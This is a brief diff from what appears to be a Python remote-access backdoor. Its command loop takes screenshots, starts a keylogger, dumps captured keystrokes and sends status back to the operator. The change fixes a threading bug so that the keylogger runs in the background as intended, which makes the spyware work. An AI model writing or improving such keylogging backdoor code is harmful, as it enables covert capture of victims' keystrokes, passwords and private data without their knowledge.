@@ -66,7 +66,7 @@ def shell():
 			os.remove('screenshot.png')
 		elif command[:12] == "keylog_start":
 			keylog = keylogger.Keylogger()
-			t = threading.Thread(target=keylog.start())
+			t = threading.Thread(target=keylog.start)
 			t.start()
 			send_data("[+] Keylogger Started!")
 		elif command[:11] == "keylog_dump":
